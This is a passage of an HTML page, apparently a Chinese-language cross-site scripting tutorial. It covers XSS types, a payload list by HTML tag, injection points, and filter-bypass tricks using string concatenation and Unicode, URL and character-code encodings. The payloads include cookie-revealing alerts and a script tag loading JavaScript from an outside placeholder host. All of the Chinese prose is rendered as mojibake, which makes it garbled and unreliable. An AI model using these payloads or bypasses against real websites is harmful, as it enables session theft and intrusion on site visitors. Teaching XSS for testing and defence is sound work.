href="#325-%E8%BF%87%E6%BB%A4url%E5%9C%B0%E5%9D%80">3.2.5 è¿‡æ»¤URLåœ°å€</a></li></ul></li></ul></li><li><a href="#4-%E5%88%A9%E7%94%A8">4 åˆ©ç”¨</a><ul><li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">å‚è€ƒæ–‡ç« </a></li></ul></li></ul><h1 id="1-XSS-æ¦‚è¿°å’ŒåŸç†"><a href="#1-XSS-æ¦‚è¿°å’ŒåŸç†" class="headerlink" title="1 XSS æ¦‚è¿°å’ŒåŸç†"></a>1 XSS æ¦‚è¿°å’ŒåŸç†</h1><p>è·¨ç«™è„šæœ¬æ”»å‡»æ˜¯ä¸€ç§å¸¸è§çš„webå®‰å…¨æ¼æ´ï¼Œå®ƒä¸»è¦æ˜¯æŒ‡æ”»å‡»è€…å¯ä»¥åœ¨é¡µé¢ä¸­æ’å…¥æ¶æ„è„šæœ¬ä»£ç ï¼Œå½“å—å®³è€…è®¿é—®è¿™äº›é¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šè§£æå¹¶æ‰§è¡Œè¿™äº›æ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°çªƒå–ç”¨æˆ·èº«ä»½&#x2F;é’“é±¼&#x2F;ä¼ æ’­æ¶æ„ä»£ç ç­‰è¡Œä¸ºã€‚  </p><p>HTMLæ˜¯ä¸€ç§è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼Œé€šè¿‡å°†ä¸€äº›å­—ç¬¦ç‰¹æ®Šåœ°å¯¹å¾…æ¥åŒºåˆ«æ–‡æœ¬å’Œæ ‡è®°ï¼Œä¾‹å¦‚ï¼Œå°äºç¬¦å· &lt; è¢«çœ‹ä½œæ˜¯HTMLæ ‡ç­¾çš„å¼€å§‹ï¼Œä¹‹é—´çš„å­—ç¬¦æ˜¯é¡µé¢çš„æ ‡é¢˜ç­‰ç­‰ã€‚å½“åŠ¨æ€é¡µé¢ä¸­æ’å…¥çš„å†…å®¹å«æœ‰è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚&lt;ï¼‰æ—¶ï¼Œç”¨æˆ·æµè§ˆå™¨ä¼šå°†å…¶è¯¯è®¤ä¸ºæ˜¯æ’å…¥äº†HTMLæ ‡ç­¾ï¼Œå½“è¿™äº›HTMLæ ‡ç­¾å¼•å…¥äº†ä¸€æ®µJavaScriptè„šæœ¬æ—¶ï¼Œè¿™äº›è„šæœ¬ç¨‹åºå°±å°†ä¼šåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚æ‰€ä»¥ï¼Œå½“è¿™äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½è¢«åŠ¨æ€é¡µé¢æ£€æŸ¥æˆ–æ£€æŸ¥å‡ºç°å¤±è¯¯æ—¶ï¼Œå°±å°†ä¼šäº§ç”ŸXSSæ¼æ´ã€‚</p><h1 id="1-1-XSS-ç±»å‹"><a href="#1-1-XSS-ç±»å‹" class="headerlink" title="1.1 XSS ç±»å‹"></a>1.1 XSS ç±»å‹</h1><ul><li>å­˜å‚¨å‹XSS</li></ul><p>å­˜å‚¨å‹XSSï¼ŒæŒä¹…åŒ–ï¼Œä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼Œæ’å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™è§¦å‘ä»£ç æ‰§è¡Œã€‚è¿™ç§XSSæ¯”è¾ƒå±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œç›—çªƒ cookie</p><p><img src="/img/article/XSS/%E5%AD%98%E5%82%A8%E5%9E%8Bxss.png" alt="å­˜å‚¨å‹xss"></p><ul><li>åå°„å‹XSS</li></ul><p>éæŒä¹…åŒ–ï¼Œéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚åå°„å‹XSSå¤§å¤šæ•°æ˜¯ç”¨æ¥ç›—å–ç”¨æˆ·çš„Cookieä¿¡æ¯ã€‚</p><p><img src="/img/article/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss.png" alt="åå°„å‹xss"></p><ul><li>DOMå‹XSS</li></ul><p>ä¸ç»è¿‡åç«¯ï¼ŒDOM-XSSæ¼æ´æ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆDocument Objeet Modelï¼ŒDOMï¼‰çš„ä¸€ç§æ¼æ´ï¼ŒDOMâ€”XSSæ˜¯é€šè¿‡urlä¼ å…¥å‚æ•°å»æ§åˆ¶è§¦å‘çš„ï¼Œå…¶å®ä¹Ÿå±äºåå°„å‹XSSã€‚DOMçš„è¯¦è§£ï¼šDOMæ–‡æ¡£å¯¹è±¡æ¨¡å‹  </p><blockquote><p>å¯èƒ½è§¦å‘DOMå‹XSSçš„å±æ€§ï¼šdocument.referer window.name location innerHTML documen.write </p></blockquote><h1 id="2-XSS-è½½è·ä¸æ’å…¥ä½ç½®"><a href="#2-XSS-è½½è·ä¸æ’å…¥ä½ç½®" class="headerlink" title="2 XSS è½½è·ä¸æ’å…¥ä½ç½®"></a>2 XSS è½½è·ä¸æ’å…¥ä½ç½®</h1><h2 id="2-1-è½½è·"><a href="#2-1-è½½è·" class="headerlink" title="2.1 è½½è·"></a>2.1 è½½è·</h2><blockquote><p>tip: æ‰€æœ‰çš„é—­åˆæ ‡ç­¾çš„ <code>&gt;</code> éƒ½å¯ä»¥ç”¨ <code>//</code> ä»£æ›¿ </p></blockquote><h3 id="2-1-1-script-æ ‡ç­¾"><a href="#2-1-1-script-æ ‡ç­¾" class="headerlink" title="2.1.1 script æ ‡ç­¾"></a>2.1.1 script æ ‡ç­¾</h3><ul><li>script æ ‡ç­¾æ˜¯æœ€ç›´æ¥çš„XSSæœ‰æ•ˆè½½è·ï¼Œè„šæœ¬æ ‡è®°å¯ä»¥å¼•ç”¨å¤–éƒ¨çš„ JavaScript ä»£ç ï¼Œä¹Ÿå¯ä»¥å°†ä»£ç æ’å…¥è„šæœ¬æ ‡è®°ä¸­</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ï¼ƒ å¼¹å‡º1ï¼Œå¯¹äºæ•°å­—å¯ä»¥ä¸ç”¨å¼•å· <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ï¼ƒ å¼¹å‡ºcookie <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>ï¼<span class="hljs-attr">http:</span>//<span class="hljs-attr">xxx.com</span>/<span class="hljs-attr">xss.js</span> &gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ï¼ƒ å¼•ç”¨å¤–éƒ¨çš„js <br></code></pre></td></tr></table></figure><h3 id="2-1-2-svg-æ ‡ç­¾"><a href="#2-1-2-svg-æ ‡ç­¾" class="headerlink" title="2.1.2 svg æ ‡ç­¾"></a>2.1.2 svg æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>//</span><br></code></pre></td></tr></table></figure><h3 id="2-1-3-img-æ ‡ç­¾"><a href="#2-1-3-img-æ ‡ç­¾" class="headerlink" title="2.1.3 img æ ‡ç­¾"></a>2.1.3 img æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">hack</span>&quot;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-4-body-æ ‡ç­¾"><a href="#2-1-4-body-æ ‡ç­¾" class="headerlink" title="2.1.4 body æ ‡ç­¾"></a>2.1.4 body æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onpageshow</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-5-video-æ ‡ç­¾"><a href="#2-1-5-video-æ ‡ç­¾" class="headerlink" title="2.1.5 video æ ‡ç­¾"></a>2.1.5 video æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">onloadstart</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/media/aaa.mp4&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-6-style-æ ‡ç­¾"><a href="#2-1-6-style-æ ‡ç­¾" class="headerlink" title="2.1.6 style æ ‡ç­¾"></a>2.1.6 style æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-7-details"><a href="#2-1-7-details" class="headerlink" title="2.1.7 details"></a>2.1.7 details</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">open</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-8-select"><a href="#2-1-8-select" class="headerlink" title="2.1.8 select"></a>2.1.8 select</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-9-iframe"><a href="#2-1-9-iframe" class="headerlink" title="2.1.9 iframe"></a>2.1.9 iframe</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;);&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-10-form"><a href="#2-1-10-form" class="headerlink" title="2.1.10 form"></a>2.1.10 form</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-11-è‡ªå®šä¹‰æ ‡ç­¾"><a href="#2-1-11-è‡ªå®šä¹‰æ ‡ç­¾" class="headerlink" title="2.1.11 è‡ªå®šä¹‰æ ‡ç­¾"></a>2.1.11 è‡ªå®šä¹‰æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:alert(666)&#x27;</span>&gt;</span>click<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:alert(document.domain)&#x27;</span>&gt;</span>click<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-2-XSS-å¯ä»¥æ’å…¥çš„ä½ç½®"><a href="#2-2-XSS-å¯ä»¥æ’å…¥çš„ä½ç½®" class="headerlink" title="2.2 XSS å¯ä»¥æ’å…¥çš„ä½ç½®"></a>2.2 XSS å¯ä»¥æ’å…¥çš„ä½ç½®</h2><ul><li>ç”¨æˆ·è¾“å…¥ä½œä¸ºscriptçš„æ ‡ç­¾å†…å®¹</li><li>ç”¨æˆ·è¾“å…¥ä½œä¸ºhtmlæ³¨é‡Šå†…å®¹</li><li>ç”¨æˆ·è¾“å…¥ä½œä¸ºhtmlæ ‡ç­¾çš„å±æ€§å</li><li>ç”¨æˆ·è¾“å…¥ä½œä¸ºhtmlæ ‡ç­¾å±æ€§å€¼</li><li>ç”¨æˆ·è¾“å…¥ä½œä¸ºhtmlæ ‡ç­¾çš„åå­—ç›´æ¥æ’å…¥åˆ°CSSé‡Œ</li></ul><h3 id="2-2-1-æµ‹è¯•ä½ç½®"><a href="#2-2-1-æµ‹è¯•ä½ç½®" class="headerlink" title="2.2.1 æµ‹è¯•ä½ç½®"></a>2.2.1 æµ‹è¯•ä½ç½®</h3><ul><li>å¸¸è§ä¸šåŠ¡åœºæ™¯<br>é‡ç¾åŒºï¼šè¯„è®ºåŒºã€ç•™è¨€åŒºã€ä¸ªäººä¿¡æ¯ã€è®¢å•ä¿¡æ¯ã€ç«™å†…ä¿¡ã€ç½‘é¡µåŠæ—¶é€šè®¯ã€ç§ä¿¡ã€æ„è§åé¦ˆ<br>å­˜åœ¨é£é™©ï¼šæœç´¢æ¡†ã€å½“å‰ç›®å½•ã€å›¾ç‰‡å±æ€§ã€URLæœ¬èº«ã€URLæ‰€æœ‰å‚æ•°ã€è¡¨å•</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">uername=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert(1)<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>&amp;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&amp;password=******<br></code></pre></td></tr></table></figure><h1 id="3-XSS-ç¼–ç ä¸ç»•è¿‡"><a href="#3-XSS-ç¼–ç ä¸ç»•è¿‡" class="headerlink" title="3 XSS ç¼–ç ä¸ç»•è¿‡"></a>3 XSS ç¼–ç ä¸ç»•è¿‡</h1><h2 id="3-1-ç½‘é¡µçš„è§£ç è¿‡ç¨‹"><a href="#3-1-ç½‘é¡µçš„è§£ç è¿‡ç¨‹" class="headerlink" title="3.1 ç½‘é¡µçš„è§£ç è¿‡ç¨‹"></a>3.1 ç½‘é¡µçš„è§£ç è¿‡ç¨‹</h2><p>ç¼–ç å°±æ˜¯å°†å­—ç¬¦å˜ä¸ºäºŒè¿›åˆ¶æ•°ï¼Œè€Œè§£ç å°±æ˜¯è¿˜åŸäºŒè¿›åˆ¶æ•°ä¸ºå­—ç¬¦ã€‚ä»æµè§ˆå™¨è¯·æ±‚urlåˆ°åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå‡ºæ¥ä¹Ÿç»å†äº†ä¸€äº›ç¼–ç å’Œè§£ç è¿‡ç¨‹ã€‚</p><ul><li>URLç¼–ç </li></ul><p>URLç¼–ç æ˜¯ä¸ºäº†å…è®¸URLä¸­å­˜åœ¨æ±‰å­—è¿™æ ·çš„éæ ‡å‡†å­—ç¬¦ï¼Œæœ¬è´¨æ˜¯æŠŠä¸€ä¸ªå­—ç¬¦è½¬ä¸º%åŠ ä¸ŠUTF-8ç¼–ç å¯¹åº”çš„16è¿›åˆ¶æ•°å­—ã€‚æ‰€ä»¥åˆç§°ä¹‹ä¸ºPercent-encodingã€‚</p><ul><li>HTMLç¼–ç &#x2F;è§£ç </li></ul><p>å½“æµè§ˆå™¨æ¥æ”¶åˆ°æœåŠ¡ç«¯å‘é€æ¥çš„äºŒè¿›åˆ¶æ•°æ®åï¼Œé¦–å…ˆä¼šå¯¹å…¶è¿›è¡ŒHTMLè§£ç ï¼Œå‘ˆç°å‡ºæ¥çš„å°±æ˜¯çœ‹åˆ°çš„æºä»£ç ã€‚å…·ä½“çš„è§£ç æ–¹å¼ä¾å…·ä½“æƒ…å†µè€Œå®šï¼Œæ‰€ä»¥éœ€è¦åœ¨é¡µé¢ä¸­æŒ‡å®šç¼–ç ï¼Œé˜²æ­¢æµè§ˆå™¨æŒ‰ç…§é”™è¯¯çš„æ–¹å¼è§£ç ï¼Œé€ æˆä¹±ç ï¼Œæ‰€ä»¥å¾ˆå¤šç½‘é¡µå°±æŒ‡å®šäº†è§£ç æ–¹å¼ä¸ºUTF-8ã€‚</p><p>ä½†æ˜¯åœ¨HTMLä¸­æœ‰äº›å­—ç¬¦æ˜¯å’Œå…³é”®è¯å†²çªçš„ï¼Œæ¯”å¦‚&lt;ã€&gt;ã€&amp;ï¼Œè§£ç ä¹‹åï¼Œæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯æ ‡ç­¾ï¼Œä¸ºäº†æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œéœ€è¦åœ¨HTMLæºä»£ç ä¸­ä½¿ç”¨å­—ç¬¦å®ä½“ï¼Œæ¯”å¦‚å¸¸è§çš„ç©ºæ ¼&amp;nbsp;ï¼Œå­—ç¬¦å®ä½“ä»¥&amp;å¼€å¤´+é¢„å…ˆå®šä¹‰çš„å®ä½“åç§°è¡¨ç¤ºï¼Œä½†ä¸æ˜¯æ‰€æœ‰çš„å­—ç¬¦éƒ½æœ‰å®ä½“åç§°ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰å®ä½“ç¼–å·ï¼Œä¹Ÿå¯ä»¥ç”¨&amp;#å¼€å¤´+å®ä½“ç¼–å·+åˆ†å·è¡¨ç¤ºã€‚æ¯”å¦‚ï¼š</p><table><thead><tr><th>æ˜¾ç¤ºç»“æœ</th><th>æè¿°</th><th>å®ä½“åç§°</th><th>å®ä½“ç¼–å·</th></tr></thead><tbody><tr><td>&lt;</td><td>å°äºå·</td><td>&lt;</td><td>&amp;#60;</td></tr><tr><td>&gt;</td><td>å¤§äºå·</td><td>&gt;</td><td>&amp;#62;</td></tr></tbody></table><p>æµè§ˆå™¨å¯¹HTMLè§£ç ä¹‹åå°±å¼€å§‹è§£æHTMLï¼Œå°†æ ‡ç­¾è½¬åŒ–ä¸ºå†…å®¹æ ‘ä¸­çš„DOMèŠ‚ç‚¹ï¼Œæ­¤æ—¶è¯†åˆ«æ ‡ç­¾çš„æ—¶å€™ï¼ŒHTMLè§£æå™¨æ˜¯æ— æ³•è¯†åˆ«é‚£äº›è¢«å®ä½“ç¼–ç çš„å†…å®¹çš„ï¼Œåªæœ‰å»ºç«‹èµ·DOMæ ‘ï¼Œæ‰èƒ½å¯¹æ¯ä¸ªèŠ‚ç‚¹çš„å†…å®¹è¿›è¡Œè¯†åˆ«ï¼Œå¦‚æœå‡ºç°å®ä½“ç¼–ç ï¼Œåˆ™ä¼šè¿›è¡Œå®ä½“è§£ç ï¼Œåªè¦æ˜¯DOMèŠ‚ç‚¹é‡Œå±æ€§çš„å€¼ï¼Œéƒ½å¯ä»¥è¢«HTMLç¼–ç å’Œè§£æã€‚</p><blockquote><p>tip:æ‰€ä»¥åœ¨PHPä¸­ï¼Œä½¿ç”¨htmlspecialchars()å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œåªæœ‰ç­‰åˆ°DOMæ ‘å»ºç«‹èµ·æ¥åï¼Œæ‰ä¼šè§£æHTMLå®ä½“ï¼Œèµ·åˆ°äº†XSSé˜²æŠ¤ä½œç”¨ã€‚</p></blockquote><ul><li>JSè§£ç ï¼ˆåªæ”¯æŒUNICODEï¼‰</li></ul><p>å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚<code>&lt;script&gt; &lt;style&gt;</code>è¿™æ ·çš„æ ‡ç­¾ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JSè§£ææ¨¡å¼ï¼Œè€Œsrcã€ href åè¾¹åŠ å…¥çš„javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥JS çš„è§£ææ¨¡å¼ã€‚</p><p>æ¯”å¦‚<code>&lt;a href=&quot;javascript:alert(&#39;&lt;\u4e00&gt;&#39;)&quot;&gt;test&lt;/a&gt;</code>ï¼Œjavascript å‡ºå‘äº†JS è§£é‡Šå™¨ï¼ŒJSä¼šå…ˆå¯¹å†…å®¹è¿›è¡Œè§£æï¼Œé‡Œè¾¹æœ‰ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦\u4e00ï¼Œå‰å¯¼çš„ \u è¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªunicode å­—ç¬¦ï¼Œæ ¹æ®åè¾¹çš„æ•°å­—ï¼Œè§£æä¸ºä¸€ï¼Œäºæ˜¯åœ¨å®ŒæˆJSçš„è§£æä¹‹åå˜æˆäº†ï¼šhref&#x3D;â€javascript:alert(â€˜&lt;ä¸€&gt;â€™)â€&gt;test</p><h2 id="3-2-ç»•è¿‡"><a href="#3-2-ç»•è¿‡" class="headerlink" title="3.2 ç»•è¿‡"></a>3.2 ç»•è¿‡</h2><h3 id="3-2-1-å…³é”®å­—è¢«è¿‡æ»¤"><a href="#3-2-1-å…³é”®å­—è¢«è¿‡æ»¤" class="headerlink" title="3.2.1 å…³é”®å­—è¢«è¿‡æ»¤"></a>3.2.1 å…³é”®å­—è¢«è¿‡æ»¤</h3><h4 id="3-2-1-1-åŒå†™ç»•è¿‡"><a href="#3-2-1-1-åŒå†™ç»•è¿‡" class="headerlink" title="3.2.1.1 åŒå†™ç»•è¿‡"></a>3.2.1.1 åŒå†™ç»•è¿‡</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">scrscriptipt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">scrscriptipt</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-2-å­—ç¬¦æ‹¼æ¥"><a href="#3-2-1-2-å­—ç¬¦æ‹¼æ¥" class="headerlink" title="3.2.1.2 å­—ç¬¦æ‹¼æ¥"></a>3.2.1.2 å­—ç¬¦æ‹¼æ¥</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">top[<span class="hljs-string">&quot;al&quot;</span>+<span class="hljs-string">&quot;ert&quot;</span>](<span class="hljs-string">`xss`</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-1-3-ç¼–ç ç»•è¿‡"><a href="#3-2-1-3-ç¼–ç ç»•è¿‡" class="headerlink" title="3.2.1.3 ç¼–ç ç»•è¿‡"></a>3.2.1.3 ç¼–ç ç»•è¿‡</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"># Unicode ç¼–ç <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#34;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#34;</span><span class="hljs-symbol">&amp;#41;</span><span class="hljs-symbol">&amp;#59;</span>&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span><br><br># url ç¼–ç <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br># ascii ç <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span><br><br># hex ç <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span 